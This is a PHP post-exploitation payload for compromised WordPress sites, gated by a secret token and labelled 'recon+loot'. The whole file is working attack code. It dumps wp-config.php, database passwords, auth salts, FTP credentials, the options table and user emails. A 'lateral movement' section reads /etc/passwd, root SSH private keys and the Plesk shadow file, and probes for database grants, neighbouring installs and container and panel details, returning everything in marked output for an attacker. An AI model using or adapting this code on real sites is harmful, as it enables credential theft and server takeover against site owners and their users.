<?php
if (!hash_equals('7754359aa07c4691fb5831cf202a5654', (string)($_GET['t'] ?? ''))) { http_response_code(404); exit; }
// WP recon+loot — unified payload. Supersedes _WS_LOOT (2026-07-22).
// Delivery contexts share THIS core; only the prefix differs:
//   direct file  : <?php + token gate, page/per from $_GET['page']/['per']
//   REST eval    : strip <?php, prefix sets $w2s_page/$w2s_per (printf slots)
//   snippet eval : strip <?php, prefix sets $w2s_page from $_GET['w2s_page']
// Page 0: full recon (host/wp/secrets/users/plugins/theme/priv) + raw wp-config
// + first options page; second emit appends lateral. page>0: options only.
// Emit: W2S::{json}::END (page 0 emits twice — parser takes the LAST marker).
// Options are NORMALIZED via w2s_val(): PHP-serialize values and base64 wraps
// become native JSON structures; transforms are recorded in options_meta.
error_reporting(0);
@ini_set('display_errors',0);
@set_time_limit(45);
ob_start();

// Page/per resolution — a context prefix may pre-set $w2s_page/$w2s_per.
$w2s_page = isset($w2s_page)?(int)$w2s_page:(int)($_GET['page']??0);
$w2s_per  = isset($w2s_per)?(int)$w2s_per:(int)($_GET['per']??400);
if($w2s_page<0)$w2s_page=0;
if($w2s_per<1||$w2s_per>2000)$w2s_per=400;

$o=array('config_path'=>null,'config'=>null,'options'=>null,'options_meta'=>null,'options_total'=>null,'users'=>null,'db_via'=>null);
$w2s_done=false;
function _r($d){echo 'W2S::'.json_encode($d,defined('JSON_INVALID_UTF8_SUBSTITUTE')?JSON_INVALID_UTF8_SUBSTITUTE:0).'::END';@ob_flush();@flush();}
// Value normalizer — options leave this payload as NATIVE JSON, never PHP-serialize strings.
// unserialize loop handles double-nesting; base64 heuristic catches aalb-style wraps.
// Returns array(value,enc|null): enc is php_ser/b64 (or null when passed through) and is
// recorded in options_meta so no transform is silent.
function w2s_val($v){
 $enc=null;
 if(is_string($v)){
  // PHP-serialize loop (max 3 deep) — arrays/objects become native structures
  for($i=0;$i<3&&is_string($v);$i++){
   if(!preg_match('/^(a|O|s|S|i|d|b|N)(:\d+)?[:;{]/',$v))break;
   $u=@unserialize($v);
   if($u===false&&$v!=='b:0;')break;
   $v=$u;$enc=$enc?:'php_ser';
  }
  // base64 wrap (alb plugins) — decode only when the result is valid UTF-8 text
  // (no control bytes, no high-byte garbage). Binary stays as-is.
  if(is_string($v)&&strlen($v)>=32&&strlen($v)%4===0&&preg_match('/^[A-Za-z0-9+\/]+={0,2}$/',$v)){
   $d=@base64_decode($v,true);
   if($d!==false&&$d!==''&&!preg_match('/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f\x80-\xff]/',$d)){$v=$d;$enc=$enc?$enc.'+b64':'b64';}
  }
 }
 return array($v,$enc);
}
// Shutdown sentinel (flag pattern, field-proven): when a wp-load include
// die()s the process on hardened hosts, partial loot still ships.
register_shutdown_function(function()use(&$o,&$w2s_done){if(!$w2s_done)_r($o);});

// ── wp-config raw capture (walk-up: stock, webroot-above-config, bedrock) ──
function w2sl_up($start,$file){$d=$start;for($i=0;$i<7;$i++){if(@is_file($d.'/'.$file))return $d.'/'.$file;$p=dirname($d);if($p===$d)break;$d=$p;}return null;}
$cfgp=null;
if(defined('ABSPATH'))foreach(array(ABSPATH.'wp-config.php',dirname(ABSPATH).'/wp-config.php')as$c){if(@is_file($c)){$cfgp=$c;break;}}
if(!$cfgp)$cfgp=w2sl_up(__DIR__,'wp-config.php');
$cfg=$cfgp?@file_get_contents($cfgp):null;
if(is_string($cfg)&&strlen($cfg)>262144)$cfg=substr($cfg,0,262144);
$o['config_path']=$cfgp;
$o['config']=$cfg;

// ── Bootstrap WP if not in scope (direct-file context) ──
if(!defined('ABSPATH')){
 $d=__DIR__;
 for($i=0;$i<6&&!defined('ABSPATH');$i++){
  foreach(array("$d/wp-load.php","$d/wp/wp-load.php",dirname($d)."/wp-load.php")as$p)
   if(@file_exists($p)){@require_once $p;break 2;}
  $d=dirname($d);
 }
}

// Secrets from wp-config defines (whatever survived the bootstrap)
$S=array();
foreach(array('DB_PASSWORD','DB_USER','DB_NAME','DB_HOST','AUTH_KEY','AUTH_SALT',
 'SECURE_AUTH_KEY','SECURE_AUTH_SALT','LOGGED_IN_KEY','LOGGED_IN_SALT','NONCE_KEY','NONCE_SALT',
 'FTP_HOST','FTP_USER','FTP_PASS')as$c)
 if(defined($c)){$v=@constant($c);if(is_string($v))$S[$c]=$v;}

global $wpdb,$wp_version;
$W=(isset($wpdb)&&$wpdb)?$wpdb:null;
$_trans="option_name NOT LIKE '_transient%' AND option_name NOT LIKE '_site_transient%'";

if($W){
 // ── TIER wpdb: full recon through the target's OWN $wpdb ──
 $o['db_via']='wpdb';
 $o['options_total']=(int)@$W->get_var("SELECT COUNT(*) FROM `$W->options` WHERE $_trans");
 $_rows=@$W->get_results("SELECT option_name,option_value FROM `$W->options` WHERE $_trans ORDER BY option_id LIMIT ".($w2s_page*$w2s_per).", $w2s_per",ARRAY_A);
 if(is_array($_rows)){$O=array();$M=array();foreach($_rows as$r){list($nv,$ne)=w2s_val($r['option_value']);$O[$r['option_name']]=$nv;if($ne)$M[$r['option_name']]=$ne;}$o['options']=$O;if($M)$o['options_meta']=$M;}

 if($w2s_page===0){
  // Users + roles in ONE query (500 cap — superset of legacy loot users)
  $U=array();$capkey=$W->prefix.'capabilities';
  $_us=@$W->get_results("SELECT u.ID,u.user_login,u.user_email,u.user_registered,m.meta_value AS caps FROM `$W->users` u LEFT JOIN `$W->usermeta` m ON m.user_id=u.ID AND m.meta_key='$capkey' ORDER BY u.ID LIMIT 500",ARRAY_A);
  if(is_array($_us))foreach($_us as$u){
   $role=null;
   if($u['caps']){$d2=@unserialize($u['caps']);if(is_array($d2))$role=array_keys($d2);}
   $U[]=array('id'=>$u['ID'],'user_login'=>$u['user_login'],'user_email'=>$u['user_email'],'user_registered'=>$u['user_registered'],'role'=>$role);
  }
  $o['users']=$U;

  // Host SA
  $_df=array_map('trim',explode(',',@ini_get('disable_functions')?:''));
  $E=false;
  foreach(array('shell_exec','exec','system','passthru','proc_open','popen')as$f)
   if(function_exists($f)&&!in_array($f,$_df)){$E=true;break;}
  $ud=function_exists('wp_upload_dir')?wp_upload_dir():array('path'=>'');
  $_upath=isset($ud['path'])?$ud['path']:'';
  $o['host']=array(
   'php_version'=>PHP_VERSION,'sapi'=>php_sapi_name(),
   'uname'=>function_exists('php_uname')?@php_uname():'',
   'server'=>$_SERVER['SERVER_SOFTWARE']??'',
   'ip'=>$_SERVER['SERVER_ADDR']??'',
   'docroot'=>$_SERVER['DOCUMENT_ROOT']??'',
   'open_basedir'=>@ini_get('open_basedir')?:'',
   'disabled'=>@ini_get('disable_functions')?:'',
   'exts'=>@get_loaded_extensions()?:array(),
   'can_exec'=>$E,'upload_dir'=>$_upath,
   'upload_writable'=>$_upath?@is_writable($_upath):false,
  );

  // WP SA — site fields read live (options page 0 may not contain them)
  $_opt=function($n)use($W){return @$W->get_var("SELECT option_value FROM `$W->options` WHERE option_name='$n' LIMIT 1");};
  $_ap=$_opt('active_plugins');
  $o['wp']=array(
   'version'=>$wp_version??'',
   'is_multisite'=>function_exists('is_multisite')?is_multisite():false,
   'table_prefix'=>$W->prefix??'',
   'blogname'=>$_opt('blogname')?:'',
   'blogdescription'=>$_opt('blogdescription')?:'',
   'siteurl'=>$_opt('siteurl')?:'',
   'home'=>$_opt('home')?:'',
   'admin_email'=>$_opt('admin_email')?:'',
   'permalink'=>$_opt('permalink_structure')?:'',
   'wp_debug'=>defined('WP_DEBUG')?WP_DEBUG:false,
   'disallow_file_mods'=>defined('DISALLOW_FILE_MODS')?DISALLOW_FILE_MODS:false,
   'disallow_file_edit'=>defined('DISALLOW_FILE_EDIT')?DISALLOW_FILE_EDIT:false,
   'db_version'=>method_exists($W,'db_version')?$W->db_version():'',
  );
  $o['plugins']=is_string($_ap)?@unserialize($_ap):null;
  $t=function_exists('wp_get_theme')?wp_get_theme():null;
  $o['theme']=$t?array('name'=>$t->get('Name'),'version'=>$t->get('Version'),'template'=>$t->get_template()):null;
  $cu=function_exists('wp_get_current_user')?wp_get_current_user():null;
  $o['priv']=array(
   'user_login'=>$cu?$cu->user_login:'',
   'role'=>$cu?$cu->roles:array(),
   'is_admin'=>function_exists('current_user_can')?@current_user_can('manage_options'):false,
  );
 }
}elseif(is_string($cfg)&&function_exists('mysqli_connect')){
 // ── TIER mysqli: NO WordPress code loaded — survives security plugins that
 // die() inside wp-load on hardened hosts (field-proven class: 200/0B hosts).
 $q=chr(39);
 $def=function($k,$c)use($q){
  if(preg_match('/'.$k.$q.'.*?'.$q.'([^'.$q.']+)'.$q.'/',$c,$m))return $m[1];
  if(preg_match('/'.$k.$q.'\s*,\s*([A-Z_][A-Z0-9_]*)\s*\)/',$c,$m)&&defined($m[1])){$v=constant($m[1]);return is_string($v)?$v:'';}
  // docker/managed getenv_docker('WORDPRESS_DB_HOST','db') pattern
  if(preg_match('/WORDPRESS_'.$k.$q.'\s*,\s*'.$q.'([^'.$q.']*)'.$q.'/',$c,$m)){
   $ev=getenv('WORDPRESS_'.$k);if(is_string($ev)&&$ev!=='')return $ev;return $m[1];}
  $ev=getenv('WORDPRESS_'.$k);if(is_string($ev)&&$ev!=='')return $ev;
  return '';};
 $pfx='wp_';
 if(preg_match('/table_prefix\s*=\s*'.$q.'([^'.$q.']+)'.$q.'/',$cfg,$m))$pfx=$m[1];
 elseif(preg_match('/WORDPRESS_TABLE_PREFIX'.$q.'\s*,\s*'.$q.'([^'.$q.']*)'.$q.'/',$cfg,$m)){
  $ev=getenv('WORDPRESS_TABLE_PREFIX');$pfx=(is_string($ev)&&$ev!=='')?$ev:$m[1];}
 $h=$def('DB_HOST',$cfg);$po=3306;
 if(strpos($h,':')!==false){$hp=explode(':',$h);$h=$hp[0];if(ctype_digit(end($hp)))$po=(int)end($hp);}
 $mc=null;try{$mc=mysqli_connect($h,$def('DB_USER',$cfg),$def('DB_PASSWORD',$cfg),$def('DB_NAME',$cfg),$po);}catch(\Throwable $e){}
 if($mc){
  $o['db_via']='mysqli';
  $rq=function($q2)use($mc){$r=@mysqli_query($mc,$q2);$a=array();if($r){while($row=mysqli_fetch_row($r))$a[]=$row;}return $a;};
  $ct=$rq("SELECT COUNT(*) FROM {$pfx}options WHERE $_trans");
  $o['options_total']=isset($ct[0][0])?(int)$ct[0][0]:null;
  $rows=$rq("SELECT option_name,option_value FROM {$pfx}options WHERE $_trans ORDER BY option_id LIMIT ".($w2s_page*$w2s_per).", $w2s_per");
  if($rows){$O=array();$M=array();foreach($rows as$r){list($nv,$ne)=w2s_val($r[1]);$O[$r[0]]=$nv;if($ne)$M[$r[0]]=$ne;}$o['options']=$O;if($M)$o['options_meta']=$M;}
  if($w2s_page===0){
   $ur=$rq("SELECT ID,user_login,user_email,user_registered FROM {$pfx}users ORDER BY ID LIMIT 500");
   if($ur){$U=array();foreach($ur as$r){$U[]=array('id'=>$r[0],'user_login'=>$r[1],'user_email'=>$r[2],'user_registered'=>$r[3],'role'=>null);}$o['users']=$U;}
   $o['host']=array('php_version'=>PHP_VERSION,'sapi'=>php_sapi_name(),
    'uname'=>function_exists('php_uname')?@php_uname():'',
    'server'=>$_SERVER['SERVER_SOFTWARE']??'','docroot'=>$_SERVER['DOCUMENT_ROOT']??'',
    'note'=>'wp-bootstrap-failed: degraded recon via mysqli');
  }
 }
}

if($o['options']===null&&$o['db_via']===null)
 $o['error']=defined('ABSPATH')?'wpdb-not-initialized':'wp-load-not-found';
if($S)$o['secrets']=$S;

// Paged fast path: options only, single emit, no lateral.
if($w2s_page>0){$w2s_done=true;_r($o);return;}

// Emit core SA now — lateral probes may timeout, this ships first.
_r($o);
if($o['db_via']!=='wpdb'){$w2s_done=true;return;} // lateral needs WP bootstrap

// ── LATERAL MOVEMENT PROBES ──
$G=array();
$_gr=@$W->get_results("SHOW GRANTS",ARRAY_A);
if(is_array($_gr))foreach($_gr as$r){$v=reset($r);if($v)$G[]=$v;}
$DBS=array();
$_ds=@$W->get_col("SHOW DATABASES");
if(is_array($_ds))$DBS=$_ds;

// Neighbor wp-config.php files (other WP installs on same box)
$NC=array();
$d=__DIR__;
for($i=0;$i<5;$i++){
 $d=dirname($d);
 $p="$d/wp-config.php";
 if(@is_file($p)&&@is_readable($p))$NC[]=$p;
}

// /etc/passwd — shell users only
$PW=array();
$_pw=@file_get_contents('/etc/passwd');
if($_pw){
 foreach(explode("\n",$_pw)as$l){
  $parts=explode(':',$l);
  if(count($parts)>=7&&$parts[6]&&$parts[6]!=='/bin/nologin'&&$parts[6]!=='/usr/sbin/nologin'&&$parts[6]!=='/bin/false')
   $PW[]=$parts[0].':'.$parts[6];
 }
 $PW=array_slice($PW,0,50);
}

// SSH keys — root + current user's home only
$SK=array();
$_home=array('/root/.ssh/id_rsa','/root/.ssh/id_ed25519');
if(!empty($o['priv']['user_login'])){
 $h=dirname($_SERVER['DOCUMENT_ROOT']??'/');
 $_home[]=$h.'/.ssh/id_rsa';
}
foreach($_home as$p){
 $c=@file_get_contents($p);
 if($c&&strpos($c,'PRIVATE KEY')!==false)$SK[]=array('path'=>$p,'key'=>substr($c,0,512));
}

// Container + panel detection
$CTN='';
if(@file_exists('/.dockerenv'))$CTN='docker';
$_cg=@file_get_contents('/proc/1/cgroup');
if($_cg){
 if(strpos($_cg,'kubepods')!==false)$CTN.=$CTN?'+k8s':'k8s';
 elseif(strpos($_cg,'docker')!==false||strpos($_cg,'containerd')!==false)$CTN=$CTN?:'container';
}
if(@is_dir('/var/run/secrets/kubernetes.io/serviceaccount'))$CTN.=$CTN?'+k8s-sa':'k8s-sa';

$PN='';
foreach(array(
 'cpanel'=>'/usr/local/cpanel','plesk'=>'/usr/local/psa','plesk-opt'=>'/opt/psa',
 'directadmin'=>'/usr/local/directadmin','virtualmin'=>'/usr/share/webmin',
 'cyberpanel'=>'/usr/local/CyberPanel','hestiacp'=>'/usr/local/hestia',
 'ispconfig'=>'/usr/local/ispconfig','aapanel'=>'/www/server/panel',
 'cloudpanel'=>'/etc/cloudpanel','runcloud'=>'/etc/runcloud',
)as$n=>$p)
 if(@is_dir($p))$PN=$PN?'+'.$n:$n;

$HP='';
if(function_exists('is_wpe')&&@is_wpe()==="1")$HP='wpengine';
elseif(getenv('PANTHEON_ENVIRONMENT'))$HP='pantheon';
elseif(getenv('KINSTA_SITE_ID'))$HP='kinsta';
elseif(getenv('PRESSABLE_FILE_PLUGIN'))$HP='pressable';
elseif(function_exists('is_atomic_platform')&&@is_atomic_platform())$HP='wpcom';
elseif(getenv('CW_ENV'))$HP='cloudways';
elseif(getenv('WPE_PLUGIN_HOST'))$HP='wpengine';
elseif(getenv('SG_PUBLIC'))$HP='siteground';

// REST routes (slow on plugin-heavy sites — probed after core emit).
// try/catch is REQUIRED: on a front-end request (snippet context) building
// the REST server re-fires rest_api_init, and a plugin's route-registration
// code can fatal (code-snippets redeclare) — killing the process before the
// lateral emit. In REST/direct context the server already exists (no-op).
$R=array();
if(function_exists('rest_get_server')){
 try{$_rs=rest_get_server();$_rt=$_rs?$_rs->get_routes():array();
  if(is_array($_rt))$R=array_slice(array_keys($_rt),0,200);}catch(\Throwable $e){}
}
// Cron
$K=array();
if(function_exists('_get_cron_array'))
 try{foreach(_get_cron_array()as$ts=>$hooks)
  if(is_array($hooks))foreach($hooks as$hook=>$j){$K[]=array('ts'=>$ts,'hook'=>$hook);if(count($K)>=100)break 2;}}catch(\Throwable $e){}

// Panel-specific loot
$PL=array();
if(strpos($PN,'cpanel')!==false)$PL['cpanel_users']=@scandir('/var/cpanel/users/')?:array();
if(strpos($PN,'plesk')!==false)$PL['psa_shadow']=@file_get_contents('/etc/psa/.psa.shadow')?:'';
if(strpos($PN,'directadmin')!==false)$PL['da_users']=@scandir('/usr/local/directadmin/data/users/')?:array();

$o['lateral']=array(
 'grants'=>$G,'databases'=>$DBS,'neighbor_configs'=>$NC,'shell_users'=>$PW,
 'ssh_keys'=>$SK,'container'=>$CTN,'panel'=>$PN,'managed_host'=>$HP,
 'rest_routes'=>$R,'cron'=>$K,'panel_loot'=>$PL,
);
$w2s_done=true;  // flag suppresses the sentinel — no hard ob_end_clean here:
// in eval contexts (snippet/REST) code-snippets captures our echo via
// ob_start()/ob_get_clean(); closing all levels would DISCARD the emitted
// markers → empty loot. Natural script end is sufficient.
_r($o);